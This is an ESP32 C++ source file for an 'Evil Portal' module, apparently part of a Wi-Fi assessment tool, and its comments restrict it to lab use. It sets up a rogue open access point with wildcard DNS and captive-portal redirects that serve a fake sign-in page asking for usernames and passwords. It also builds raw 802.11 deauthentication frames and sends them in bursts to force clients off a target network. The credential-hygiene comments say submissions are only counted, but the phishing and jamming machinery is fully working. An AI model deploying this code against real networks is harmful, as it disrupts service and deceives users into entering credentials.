// G1 — Evil Portal: captive-portal assessment module with evidence integration.
// Clean-room implementation for NEONDRIVE. Controlled-lab use only.
//
// CREDENTIAL HYGIENE (deliberate design):
//   - Submitted usernames/passwords are NEVER persisted: not to SD, not to
//     logs, not to Serial, not to any buffer that outlives the HTTP handler.
//   - handleLogin() reads the form fields only to validate presence, counts
//     the submission, records a timestamped *event* (via AnalyzerSync), and
//     drops the values.
//   - What IS recorded: portal start/stop, client associations (counts),
//     submission counts, kicker activity. Counts feed the session quick-verdict
//     as credential evidence (FAIL) without ever holding credential material.
//
// While running, the portal owns the WiFi stack (AP + DNS + HTTP on port 80).
// main.cpp suspends the management web UI for the duration and restores it
// on stop, so portal clients can never reach the admin interface.

#include "evil_portal.h"
#include "analyzer_sync.h"

#include <esp_wifi.h>
#include <SD.h>

// Global instance — satisfies the `extern EvilPortal evil_portal_obj`
// declared in evil_portal.h (and formerly dangling in WiFiScan.h).
EvilPortal evil_portal_obj;

namespace {

// Portal network
const IPAddress kApIp(192, 168, 4, 1);
const IPAddress kApGw(192, 168, 4, 1);
const IPAddress kApMask(255, 255, 255, 0);

constexpr uint32_t kKickerIntervalMs = 3000;
constexpr uint8_t  kKickerBurst     = 5;

// Minimal captive-portal login page. Generic by design.
const char kLoginPage[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>body{font-family:sans-serif;background:#f2f2f2;margin:0;padding:24px}
.card{max-width:360px;margin:40px auto;background:#fff;border-radius:8px;
padding:24px;box-shadow:0 2px 8px rgba(0,0,0,.15)}
h2{margin-top:0;font-size:20px}input{width:100%;box-sizing:border-box;
padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;
border-radius:4px;font-size:16px}</style></head>
<body><div class="card"><h2>Sign in to continue</h2>
<p>Please sign in to access the network.</p>
<form method="POST" action="/login">
<input name="username" type="text" placeholder="Username" autocomplete="off">
<input name="password" type="password" placeholder="Password" autocomplete="off">
<button type="submit">Connect</button></form></div></body></html>)HTML";

const char kSuccessPage[] PROGMEM = R"HTML(<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title></head>
<body style="font-family:sans-serif;text-align:center;padding-top:60px">
<h2>Connecting&hellip;</h2><p>You will be online shortly.</p></body></html>)HTML";

void formatMac(const uint8_t* mac, char* out, size_t outSize) {
    snprintf(out, outSize, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Clean-room 802.11 deauthentication frame (26 bytes).
// addr1=broadcast, addr2=addr3=target BSSID, reason 7.
void buildDeauthFrame(const uint8_t* bssid, uint8_t* out) {
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    out[0] = 0xC0; out[1] = 0x00;   // FC: deauth
    out[2] = 0x00; out[3] = 0x00;   // duration
    memcpy(out + 4,  bcast, 6);     // addr1: destination
    memcpy(out + 10, bssid, 6);     // addr2: source
    memcpy(out + 16, bssid, 6);     // addr3: BSSID
    out[22] = 0x00; out[23] = 0x00; // seq
    out[24] = 0x07; out[25] = 0x00; // reason: class 3 frame from nonassoc STA
}

} // namespace

EvilPortal::EvilPortal() = default;

bool EvilPortal::start(const Config& cfg, fs::FS* sd) {
    if (running_) {
        strncpy(lastError_, "portal already running", sizeof(lastError_) - 1);
        return false;
    }
    if (!cfg.ssid[0]) {
        strncpy(lastError_, "SSID required", sizeof(lastError_) - 1);
        return false;
    }
    cfg_ = cfg;
    if (cfg_.channel < 1 || cfg_.channel > 14) cfg_.channel = 6;
    if (cfg_.targetChannel < 1 || cfg_.targetChannel > 14)
        cfg_.targetChannel = cfg_.channel;

    sd_ = sd;
    clientsSeen_ = 0;
    credSubmits_ = 0;
    lastStationCount_ = 0;
    eventCount_ = 0;
    sessionStaged_ = false;
    startMs_ = millis();
    lastKickerMs_ = 0;
    lastError_[0] = '\0';
    captureDir_[0] = '\0';

    if (sd_) {
        // Local debug log dir (lifecycle events only — never credentials).
        strncpy(captureDir_, "/neondrive/portal", sizeof(captureDir_) - 1);
        sd_->mkdir("/neondrive");
        sd_->mkdir(captureDir_);
    }

    // Take over the WiFi stack.
    prevMode_ = WiFi.getMode();
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(kApIp, kApGw, kApMask);
    bool apOk = cfg_.password[0]
        ? WiFi.softAP(cfg_.ssid, cfg_.password, cfg_.channel)
        : WiFi.softAP(cfg_.ssid, nullptr, cfg_.channel);
    if (!apOk) {
        strncpy(lastError_, "softAP failed", sizeof(lastError_) - 1);
        WiFi.mode(prevMode_);
        return false;
    }

    // Allocate the server objects on the heap — see header note. They are
    // freed in stop(); a failed start cleans up before returning.
    httpServer_ = new WebServer(80);
    dnsServer_  = new DNSServer();
    if (!httpServer_ || !dnsServer_) {
        delete httpServer_; httpServer_ = nullptr;
        delete dnsServer_;  dnsServer_  = nullptr;
        strncpy(lastError_, "server alloc failed", sizeof(lastError_) - 1);
        WiFi.softAPdisconnect(true);
        WiFi.mode(prevMode_);
        return false;
    }

    // Captive DNS: resolve everything to the portal.
    dnsServer_->setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer_->start(53, "*", kApIp);

    // HTTP routes.
    httpServer_->on("/", HTTP_GET, [this]() { handleRoot(); });
    httpServer_->on("/login", HTTP_POST, [this]() { handleLogin(); });
    httpServer_->on("/generate_204", HTTP_GET, [this]() { handleCaptiveDetect(); });
    httpServer_->on("/hotspot-detect.html", HTTP_GET, [this]() { handleCaptiveDetect(); });
    httpServer_->on("/connecttest.txt", HTTP_GET, [this]() { handleCaptiveDetect(); });
    httpServer_->on("/redirect", HTTP_GET, [this]() { handleCaptiveDetect(); });
    httpServer_->on("/ncsi.txt", HTTP_GET, [this]() { handleCaptiveDetect(); });
    httpServer_->onNotFound([this]() { handleNotFound(); });
    httpServer_->begin();

    running_ = true;
    char msg[96];
    snprintf(msg, sizeof(msg), "portal started ssid='%s' ch=%u%s", cfg_.ssid,
             cfg_.channel, cfg_.deauthKicker ? " kicker=on" : "");
    bufferEvent("portal_start", "info", msg);
    writePortalLog("start", msg);
    Serial.printf("[portal] %s\n", msg);
    return true;
}

void EvilPortal::stop() {
    if (!running_) return;
    running_ = false;

    char msg[96];
    snprintf(msg, sizeof(msg),
             "portal stopped clients=%lu submits=%lu dur=%lus",
             (unsigned long)clientsSeen_, (unsigned long)credSubmits_,
             (unsigned long)((millis() - startMs_) / 1000UL));
    bufferEvent("portal_stop", "info", msg);
    writePortalLog("stop", msg);
    Serial.printf("[portal] %s\n", msg);

    if (httpServer_) { httpServer_->close(); delete httpServer_; httpServer_ = nullptr; }
    if (dnsServer_)  { dnsServer_->stop();   delete dnsServer_;  dnsServer_  = nullptr; }
    WiFi.softAPdisconnect(true);
    delay(50);
    WiFi.mode(prevMode_);

    flushEvents();
}

void EvilPortal::tick() {
    if (!running_ || !httpServer_ || !dnsServer_) return;
    dnsServer_->processNextRequest();
    httpServer_->handleClient();

    uint32_t n = WiFi.softAPgetStationNum();
    if (n > lastStationCount_) {
        uint32_t fresh = n - lastStationCount_;
        clientsSeen_ += fresh;
        char msg[96];
        snprintf(msg, sizeof(msg), "client associated (+%lu, total %lu)",
                 (unsigned long)fresh, (unsigned long)clientsSeen_);
        bufferEvent("client_associated", "info", msg);
        writePortalLog("assoc", msg);
    }
    lastStationCount_ = n;

    kickerTick();

    if (cfg_.durationSec > 0 &&
        millis() - startMs_ >= (uint32_t)cfg_.durationSec * 1000UL) {
        Serial.println("[portal] duration elapsed — auto-stopping");
        stop();
    }
}

void EvilPortal::bufferEvent(const char* type, const char* severity,
                             const char* message) {
    BufferedEvent ev;
    strncpy(ev.type, type, sizeof(ev.type) - 1);
    ev.type[sizeof(ev.type) - 1] = '\0';
    strncpy(ev.severity, severity, sizeof(ev.severity) - 1);
    ev.severity[sizeof(ev.severity) - 1] = '\0';
    strncpy(ev.message, message, sizeof(ev.message) - 1);
    ev.message[sizeof(ev.message) - 1] = '\0';
    if (eventCount_ < kEventBuf) {
        eventBuf_[eventCount_++] = ev;
    } else {
        // Full: drop the oldest, keep the newest.
        memmove(eventBuf_, eventBuf_ + 1, sizeof(ev) * (kEventBuf - 1));
        eventBuf_[kEventBuf - 1] = ev;
    }
}

void EvilPortal::flushEvents() {
    if (sessionStaged_) return;
    sessionStaged_ = true;
    if (!sd_) return;

    char bssidStr[18] = "";
    formatMac(cfg_.targetBssid, bssidStr, sizeof(bssidStr));

    AnalyzerSync::StageParams p{};
    p.capture_dir      = captureDir_[0] ? captureDir_ : "";
    p.module           = "EVILPORTAL";
    p.ssid             = cfg_.ssid;
    p.bssid            = cfg_.deauthKicker ? bssidStr : "";
    p.channel          = cfg_.channel;
    p.security         = "OPEN";
    p.pmkid_count      = 0;
    p.handshake_count  = 0;
    p.cred_submit_count = (int)credSubmits_;
    p.has_target       = true;
    if (!AnalyzerSync::stageSession(*sd_, p)) {
        Serial.printf("[portal] stage failed: %s\n",
                      AnalyzerSync::g_state.last_error);
        return;
    }
    for (uint8_t i = 0; i < eventCount_; i++) {
        AnalyzerSync::appendEvent(*sd_, eventBuf_[i].type, "EVILPORTAL",
                                  eventBuf_[i].severity, eventBuf_[i].message,
                                  "", cfg_.ssid,
                                  cfg_.deauthKicker ? bssidStr : "",
                                  cfg_.channel);
    }
    Serial.printf("[portal] session staged: %s (%u events)\n",
                  AnalyzerSync::g_state.session_id, eventCount_);
}

void EvilPortal::writePortalLog(const char* kind, const char* detail) {
    if (!sd_ || !captureDir_[0] || !kind || !detail) return;
    // Lifecycle events only — callers must never pass credential material.
    char path[128];
    snprintf(path, sizeof(path), "%s/portal.log", captureDir_);
    File f = sd_->open(path, FILE_APPEND);
    if (!f) return;
    char wall[28]; const char* src = "none";
    bool haveWall = AnalyzerSync::currentWallclockUtc(wall, sizeof(wall), src);
    f.printf("%lu", (unsigned long)millis());
    if (haveWall) { f.print(','); f.print(wall); }
    f.print(','); f.print(kind); f.print(','); f.println(detail);
    f.close();
}

void EvilPortal::handleRoot() {
    httpServer_->send_P(200, "text/html", kLoginPage);
}

void EvilPortal::handleLogin() {
    // CREDENTIAL HYGIENE: validate presence, count, drop. The values never
    // leave this function's stack: no SD, no log, no Serial, no buffers.
    bool hasUser = httpServer_->hasArg("username") &&
                   httpServer_->arg("username").length() > 0;
    bool hasPass = httpServer_->hasArg("password") &&
                   httpServer_->arg("password").length() > 0;
    if (hasUser || hasPass) {
        credSubmits_++;
        bufferEvent("credential_submitted", "warning",
                    "credential submitted via portal form (values not recorded)");
        writePortalLog("submit", "credential submitted (values not recorded)");
        Serial.printf("[portal] credential submit #%lu (values not recorded)\n",
                      (unsigned long)credSubmits_);
    }
    httpServer_->send_P(200, "text/html", kSuccessPage);
}

void EvilPortal::handleCaptiveDetect() {
    // Convince the OS a captive portal is present → opens the login UI.
    httpServer_->sendHeader("Location", "http://192.168.4.1/", true);
    httpServer_->send(302, "text/plain", "");
}

void EvilPortal::handleNotFound() {
    httpServer_->sendHeader("Location", "http://192.168.4.1/", true);
    httpServer_->send(302, "text/plain", "");
}

void EvilPortal::kickerTick() {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
    return;  // no raw frame TX on these targets (same guard as G4 Karma)
#else
    if (!cfg_.deauthKicker) return;
    uint32_t now = millis();
    if (now - lastKickerMs_ < kKickerIntervalMs) return;
    lastKickerMs_ = now;

    uint8_t frame[26];
    buildDeauthFrame(cfg_.targetBssid, frame);
    // Hop to the target channel, burst, hop back to the portal channel.
    esp_wifi_set_channel(cfg_.targetChannel, WIFI_SECOND_CHAN_NONE);
    for (uint8_t i = 0; i < kKickerBurst; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        delay(2);
    }
    esp_wifi_set_channel(cfg_.channel, WIFI_SECOND_CHAN_NONE);
    bufferEvent("kicker_deauth", "info", "deauth kicker burst sent");
#endif
}
